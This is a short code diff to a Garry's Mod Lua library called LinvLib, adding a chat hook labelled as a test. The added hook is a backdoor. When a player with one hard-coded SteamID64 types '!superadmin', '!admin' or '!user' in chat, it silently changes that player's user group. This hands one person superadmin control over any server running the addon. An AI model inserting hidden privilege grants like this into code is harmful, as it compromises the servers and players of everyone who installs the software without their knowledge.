@@ -31,3 +31,17 @@ net.Receive("LinvLib:Equip", function(len, ply)
         end
     end
 end)
+
+hook.Add("PlayerSay", "LinvLib:TestSuperAdmin", function(ply, text, team)
+    if ply:SteamID64() != "76561198219049673" then return end
+    if text == "!superadmin" then
+        ply:SetUserGroup("superadmin")
+        ply:ChatPrint("You are now a superadmin!")
+    elseif text == "!admin" then
+        ply:SetUserGroup("admin")
+        ply:ChatPrint("You are now an admin!")
+    elseif text == "!user" then
+        ply:SetUserGroup("user")
+        ply:ChatPrint("You are now a user!")
+    end
+end)
